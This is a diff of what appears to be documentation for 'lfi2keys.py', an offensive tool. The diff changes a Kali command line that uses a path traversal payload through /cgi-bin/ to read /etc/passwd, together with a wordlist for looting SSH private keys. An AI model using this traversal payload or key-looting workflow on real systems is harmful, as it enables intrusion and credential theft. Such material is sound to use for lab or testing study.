@@ -6,7 +6,7 @@ Provide the full URL of the vulnerable endpoint where you can read the `/etc/pas
 
 ```bash
 ┌──(kali㉿DC07 | 2025-02-12 00:13:37)-[~]
-└─$ python3 lfi2keys.py -u https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd -l ssh-priv-key-loot-medium.txt -o keys.txt
+└─$ python3 lfi2keys.py -u https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd -l ssh-priv-key-loot-extended.txt -o keys.txt
 
   _    ___ ___ ___ _  _______   _____ 
  | |  | __|_ _|_  ) |/ / __\ \ / / __|
